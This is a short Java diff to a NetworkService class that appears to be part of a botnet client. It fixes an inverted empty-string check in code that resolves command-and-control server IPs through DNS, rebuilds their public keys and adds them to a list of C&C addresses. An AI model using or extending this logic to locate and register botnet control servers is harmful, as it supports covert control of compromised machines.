@@ -279,7 +279,7 @@ public class NetworkService {
 			try {
 			result = botReq.getIpCeCFromDnsServer(url);
 			String buff=result.getValue1();
-				if(buff.equals("")){
+				if(!buff.equals("")){
 			cec.setValue1(new IP(buff));
 			cec.setValue2(pki.rebuildPuK(result.getValue2()));
 			commandConquerIps.add(cec);
